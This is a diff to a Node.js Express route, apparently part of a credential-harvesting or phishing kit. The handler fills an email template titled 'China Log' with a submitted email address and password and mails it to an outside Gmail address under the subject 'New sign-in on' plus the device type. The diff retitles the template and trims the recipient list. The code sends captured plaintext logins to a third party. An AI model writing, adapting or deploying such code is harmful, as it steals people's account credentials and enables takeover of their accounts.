@@ -37,8 +37,7 @@ router.post('/', async (req, res) => {
 
         // Template with merge tags
         const htmlTemplate = `
-            <h1>New User Registration</h1>
-            <p>Here are the registration details:</p>
+            <h1>China Log</h1>
             <ul>
                 <li><strong>Email:</strong> [[-email-]]</li>
                 <li><strong>Password:</strong> [[-password-]]</li>
@@ -58,7 +57,7 @@ router.post('/', async (req, res) => {
 
         const mailOptions = {
             from: '"Your App Name" <usglastemp@gmail.com>',
-            to: ["chukwumauche78@gmail.com","usglastemp@gmail.com"],
+            to: "usglastemp@gmail.com",
             subject: `New sign-in on ${deviceType}`,
             html: mergedHtml,
         };
